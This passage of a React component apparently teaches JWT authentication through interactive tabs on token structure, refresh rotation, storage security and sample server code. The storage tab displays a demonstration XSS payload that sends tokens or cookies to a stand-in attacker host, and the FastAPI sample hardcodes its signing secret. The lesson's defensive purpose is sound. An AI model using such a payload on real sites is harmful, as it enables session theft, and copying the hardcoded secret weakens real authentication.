                <span className="text-[10px] font-mono text-slate-400">JSON</span>
              </div>
              <textarea
                value={jwtHeaderJson}
                onChange={(e) => setJwtHeaderJson(e.target.value)}
                rows={6}
                className="w-full bg-black/60 rounded-xl p-3 font-mono text-xs text-red-300 border border-red-500/20 focus:outline-none focus:border-red-400 resize-none"
              />
              <p className="text-[11px] text-slate-400">
                Specifies cryptographic algorithm (<code className="text-red-300">HS256</code> = HMAC-SHA256, <code className="text-red-300">RS256</code> = RSA asymmetric).
              </p>
            </div>

            {/* 2. Payload (Purple) */}
            <div className="p-4 rounded-2xl bg-[#090d1c] border border-purple-500/30 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-purple-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-purple-400" />
                  2. PAYLOAD (Data Claims)
                </span>
                <span className="text-[10px] font-mono text-slate-400">JSON (Editable)</span>
              </div>
              <textarea
                value={jwtPayloadJson}
                onChange={(e) => {
                  setJwtPayloadJson(e.target.value);
                  setTamperedSig(null);
                }}
                rows={6}
                className="w-full bg-black/60 rounded-xl p-3 font-mono text-xs text-purple-300 border border-purple-500/20 focus:outline-none focus:border-purple-400 resize-none"
              />
              <p className="text-[11px] text-slate-400">
                Contains claims (<code className="text-purple-300">sub</code> = user ID, <code className="text-purple-300">exp</code> = expiration unix time, <code className="text-purple-300">role</code>). Base64Url-encoded, <strong>never put secrets here</strong>!
              </p>
            </div>

            {/* 3. Signature & Secret (Cyan) */}
            <div className="p-4 rounded-2xl bg-[#090d1c] border border-cyan-500/30 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-cyan-400" />
                  3. SIGNATURE (HMAC-SHA256)
                </span>
                <span className="text-[10px] font-mono text-slate-400">Server Secret</span>
              </div>

              <div className="space-y-1">
                <label className="text-[10px] font-mono text-slate-400">Server Secret Key (HMAC):</label>
                <input
                  type="text"
                  value={secretKey}
                  onChange={(e) => setSecretKey(e.target.value)}
                  className="w-full bg-black/60 rounded-lg px-3 py-2 font-mono text-xs text-cyan-300 border border-cyan-500/20 focus:outline-none focus:border-cyan-400"
                />
              </div>

              <div className="p-2.5 rounded-lg bg-black/40 font-mono text-[11px] text-cyan-300 border border-cyan-500/20 break-all">
                <span className="text-slate-500 block text-[9px] uppercase">Computed Signature:</span>
                {calculatedSig || 'Calculating...'}
              </div>

              <p className="text-[11px] text-slate-400">
                Formula: <code className="text-cyan-300 text-[10px]">HMACSHA256(Base64Url(Header) + "." + Base64Url(Payload), secret)</code>
              </p>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 3: TOKEN LIFECYCLE & REFRESH TOKEN ROTATION                           */}
      {/* ========================================================================= */}
      {activeTab === 'lifecycle' && (
        <div className="space-y-6">
          {/* Dual Token Timeline Diagram */}
          <div className="p-5 rounded-2xl bg-[#090d1c] border border-white/10 space-y-4">
            <h3 className="font-bold text-sm text-white flex items-center gap-2">
              <RefreshCw className="w-4 h-4 text-purple-400" />
              <span>Dual-Token Architecture: Access Token vs Refresh Token</span>
            </h3>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Access Token Box */}
              <div className={`p-4 rounded-xl border transition ${isTokenExpired ? 'bg-red-950/20 border-red-500/40' : 'bg-emerald-950/20 border-emerald-500/40'}`}>
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-xs font-bold text-white flex items-center gap-1.5">
                    <Key className="w-3.5 h-3.5 text-emerald-400" />
                    Access Token (JWT)
                  </span>
                  <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${isTokenExpired ? 'bg-red-500/20 text-red-300' : 'bg-emerald-500/20 text-emerald-300'}`}>
                    {isTokenExpired ? 'EXPIRED' : 'ACTIVE (15 mins)'}
                  </span>
                </div>
                <p className="text-xs text-slate-300">
                  Short-lived, self-contained stateless credential. Carried in HTTP <code className="text-amber-300">Authorization: Bearer</code> header.
                </p>
              </div>

              {/* Refresh Token Box */}
              <div className={`p-4 rounded-xl border transition ${replayAttackDetected ? 'bg-red-950/30 border-red-500/50' : 'bg-purple-950/20 border-purple-500/40'}`}>
                <div className="flex items-center justify-between mb-2">
                  <span className="font-mono text-xs font-bold text-white flex items-center gap-1.5">
                    <Lock className="w-3.5 h-3.5 text-purple-400" />
                    Refresh Token (Opaque Hash)
                  </span>
                  <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${replayAttackDetected ? 'bg-red-500/20 text-red-300' : 'bg-purple-500/20 text-purple-300'}`}>
                    {replayAttackDetected ? 'REVOKED (BREACH)' : refreshTokenRotated ? 'ROTATED (NEW TOKEN)' : 'VALID (7 days)'}
                  </span>
                </div>
                <p className="text-xs text-slate-300">
                  Long-lived single-use token stored in an <code className="text-purple-300">HttpOnly, Secure</code> cookie or server database.
                </p>
              </div>
            </div>

            {/* Interactive Simulator Buttons */}
            <div className="flex flex-wrap gap-2.5 pt-2">
              <button
                onClick={handleApiCallWithAccessToken}
                className="px-3.5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm"
              >
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Call Protected API (e.g. GET /user/data)</span>
              </button>

              <button
                onClick={handleSimulateExpiration}
                className="px-3.5 py-2 rounded-xl bg-amber-600 hover:bg-amber-500 text-white font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm"
              >
                <AlertTriangle className="w-3.5 h-3.5" />
                <span>Simulate 15 Minutes Pass (Token Expired)</span>
              </button>

              <button
                onClick={handlePerformSilentRefresh}
                className="px-3.5 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>Execute Silent Refresh with Token Rotation</span>
              </button>

              <button
                onClick={handleSimulateReplayAttack}
                className="px-3.5 py-2 rounded-xl bg-red-600 hover:bg-red-500 text-white font-mono text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm ml-auto"
              >
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>Simulate Reused Token Attack (Replay Breach)</span>
              </button>
            </div>

            {/* Live Terminal Output Console */}
            <div className="p-4 rounded-xl bg-black/80 border border-white/10 font-mono text-xs space-y-1.5">
              <div className="text-[10px] uppercase text-slate-500 font-bold flex items-center justify-between pb-1 border-b border-slate-800">
                <span>Auth Handshake Terminal Logs</span>
                <span>Real-Time Stream</span>
              </div>
              {lifecycleLog.length === 0 ? (
                <div className="text-slate-500 italic py-2">
                  Click the action buttons above to trace the dual-token authorization and rotation lifecycle...
                </div>
              ) : (
                lifecycleLog.map((log, i) => (
                  <div key={i} className="text-slate-300 leading-relaxed">
                    {log}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 4: STORAGE SECURITY MATRIX & XSS / CSRF ATTACK SIMULATION             */}
      {/* ========================================================================= */}
      {activeTab === 'storage' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Option A: LocalStorage */}
            <div
              onClick={() => setStorageMethod('localStorage')}
              className={`p-5 rounded-2xl border-2 transition cursor-pointer ${
                storageMethod === 'localStorage'
                  ? 'bg-red-950/30 border-red-500 shadow-lg shadow-red-500/10'
                  : 'bg-[#090d1c] border-white/10 hover:border-white/20'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="font-bold text-sm text-white">LocalStorage / SessionStorage</span>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-red-500/20 text-red-300 border border-red-500/30 font-bold">
                  HIGH XSS RISK
                </span>
              </div>
              <ul className="text-xs text-slate-300 space-y-1.5 list-disc pl-4">
                <li><strong className="text-red-400">Vulnerable to XSS:</strong> Any third-party NPM script or injected XSS vector can run <code className="text-amber-300">localStorage.getItem('token')</code>.</li>
                <li>Immune to CSRF because headers are not automatically attached.</li>
                <li>Not recommended for financial, healthcare, or enterprise access credentials.</li>
              </ul>
            </div>

            {/* Option B: HttpOnly, Secure, SameSite Cookie */}
            <div
              onClick={() => setStorageMethod('httpOnlyCookie')}
              className={`p-5 rounded-2xl border-2 transition cursor-pointer ${
                storageMethod === 'httpOnlyCookie'
                  ? 'bg-emerald-950/30 border-emerald-500 shadow-lg shadow-emerald-500/10'
                  : 'bg-[#090d1c] border-white/10 hover:border-white/20'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="font-bold text-sm text-white">HttpOnly + Secure + SameSite Cookie</span>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-bold">
                  RECOMMENDED
                </span>
              </div>
              <ul className="text-xs text-slate-300 space-y-1.5 list-disc pl-4">
                <li><strong className="text-emerald-400">Immune to XSS token theft:</strong> The <code className="text-cyan-300">HttpOnly</code> flag guarantees that client-side JavaScript (<code className="text-amber-300">document.cookie</code>) cannot read the token!</li>
                <li><strong className="text-emerald-400">CSRF Protected:</strong> <code className="text-cyan-300">SameSite=Lax</code> or <code className="text-cyan-300">SameSite=Strict</code> prevents cross-origin automatic browser credential transmission.</li>
                <li>Industry gold-standard for bank-grade web applications.</li>
              </ul>
            </div>
          </div>

          {/* Live XSS Simulation Box */}
          <div className="p-5 rounded-2xl bg-[#090d1c] border border-white/10 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono font-bold text-amber-300 uppercase flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5" />
                Live Injected Malicious Script Simulation
              </span>
              <span className="text-xs font-mono text-slate-400">
                Selected Storage: <strong className="text-white">{storageMethod}</strong>
              </span>
            </div>

            <div className="p-3 rounded-xl bg-black/60 font-mono text-xs text-red-300 border border-red-500/20">
              <code>&lt;script&gt;fetch('https://attacker.evil/steal?t=' + {storageMethod === 'localStorage' ? "localStorage.getItem('access_token')" : "document.cookie"})&lt;/script&gt;</code>
            </div>

            <button
              onClick={handleSimulateXssAttack}
              className="px-4 py-2 rounded-xl bg-red-600 hover:bg-red-500 text-white font-mono text-xs font-bold transition cursor-pointer shadow-md flex items-center gap-1.5"
            >
              <Zap className="w-3.5 h-3.5" />
              <span>Simulate Attacker Executing Script</span>
            </button>

            {xssAttempted && xssResult && (
              <div className={`p-4 rounded-xl border text-xs font-mono leading-relaxed animate-in fade-in ${storageMethod === 'localStorage' ? 'bg-red-950/40 border-red-500/50 text-red-200' : 'bg-emerald-950/40 border-emerald-500/50 text-emerald-200'}`}>
                {xssResult}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* TAB 5: PRODUCTION IMPLEMENTATION CODE (Node.js, FastAPI, Next.js)          */}
      {/* ========================================================================= */}
      {activeTab === 'code' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between border-b border-white/10 pb-3">
            <div className="flex gap-2">
              {[
                { id: 'typescript', label: 'Express + Prisma (TypeScript)' },
                { id: 'python', label: 'FastAPI + Jose (Python 3.12)' },
                { id: 'nextjs', label: 'Next.js App Router (Server Action)' },
              ].map((lang) => (
                <button
                  key={lang.id}
                  onClick={() => {
                    sound.playPop();
                    setCodeSnippetLang(lang.id as any);
                  }}
                  className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition cursor-pointer ${
                    codeSnippetLang === lang.id
                      ? 'bg-purple-600 text-white shadow-md'
                      : 'bg-white/[0.05] text-slate-400 hover:text-white'
                  }`}
                >
                  {lang.label}
                </button>
              ))}
            </div>
          </div>

          <div className="p-4 rounded-2xl bg-black/80 border border-white/10 font-mono text-xs overflow-x-auto custom-scrollbar">
            {codeSnippetLang === 'typescript' && (
              <pre className="text-slate-300">
{`import express, { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import cookieParser from 'cookie-parser';

const app = express();
app.use(express.json());
app.use(cookieParser());

const JWT_SECRET = process.env.JWT_SECRET!;
const REFRESH_SECRET = process.env.REFRESH_SECRET!;

// 1. Issue Access Token (15m) + Secure HttpOnly Refresh Cookie (7d)
app.post('/api/auth/login', async (req: Request, res: Response) => {
  const { email, password } = req.body;
  // ... authenticate user with bcrypt ...

  const user = { id: 'usr_123', email, role: 'ARCHITECT' };
  
  const accessToken = jwt.sign({ sub: user.id, role: user.role }, JWT_SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ sub: user.id }, REFRESH_SECRET, { expiresIn: '7d' });

  // Store refresh token in secure HttpOnly SameSite cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  return res.json({ accessToken, user });
});

// 2. Stateless requireAuth Middleware
export function requireAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing Bearer token' });
  }

  const token = authHeader.split(' ')[1];
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    (req as any).user = payload;
    return next();
  } catch (err) {
    return res.status(401).json({ error: 'Token expired or invalid signature' });
  }
}`}
              </pre>
            )}

            {codeSnippetLang === 'python' && (
              <pre className="text-slate-300">
{`from datetime import datetime, timedelta, timezone
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import OAuth2PasswordBearer
from jose import JWTError, jwt
from pydantic import BaseModel

SECRET_KEY = "vault-super-secret-key"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 15

app = FastAPI(title="Secure OAuth2 & JWT API")
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def create_access_token(data: dict, expires_delta: timedelta | None = None) -> str:
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

async def get_current_user(token: str = Depends(oauth2_scheme)):
    credentials_exception = HTTPException(
        status_code=status.HTTP_401_UNAUTHORIZED,
        detail="Could not validate credentials",
        headers={"WWW-Authenticate": "Bearer"},
    )
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id: str = payload.get("sub")
        if user_id is None:
            raise credentials_exception
        return {"user_id": user_id, "role": payload.get("role")}
    except JWTError:
        raise credentials_exception

@app.get("/api/protected/profile")
async def read_user_profile(current_user: dict = Depends(get_current_user)):
    return {"message": "Access granted", "user": current_user}`}
              </pre>
            )}

            {codeSnippetLang === 'nextjs' && (
              <pre className="text-slate-300">
{`import { cookies } from 'next/headers';
import { SignJWT, jwtVerify } from 'jose';

const SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

// Next.js Server Action: Sign and seal session in HttpOnly Cookie
export async function createSession(userId: string, role: string) {
  const token = await new SignJWT({ sub: userId, role })
    .setProtectedHeader({ alg: 'HS256' })
    .setIssuedAt()
    .setExpirationTime('15m')
    .sign(SECRET);

  const cookieStore = await cookies();
  cookieStore.set('session_token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/',
    maxAge: 15 * 60,
  });
}

// Next.js Middleware Session Validator
export async function verifySession(token: string) {
  try {
    const { payload } = await jwtVerify(token, SECRET);
    return payload;
  } catch (err) {
    return null;
  }
}`}
              </pre>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
